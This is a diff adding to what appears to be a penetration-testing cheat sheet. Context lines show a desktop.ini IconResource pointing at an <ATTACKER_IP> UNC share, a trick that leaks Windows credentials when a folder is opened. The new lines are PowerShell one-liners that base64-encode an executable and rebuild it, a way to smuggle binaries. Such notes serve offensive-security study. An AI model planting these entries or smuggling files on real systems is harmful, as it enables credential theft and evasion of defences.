@@ -84,3 +84,13 @@ $lnk.Save()
 [.ShellClassInfo]
 IconResource=\\<ATTACKER_IP>\aaa
 ```
+
+# convert binary to base64 on one line
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes('c:\users\zen\desktop\test\whoami.exe')) > whoami.txt
+```
+
+# bring it back to exe
+```powershell
+[System.IO.File]::WriteAllBytes("c:\users\zen\desktop\test\whoami2.exe", [System.Convert]::FromBase64String( (cat .\whoami.txt) ))
+```
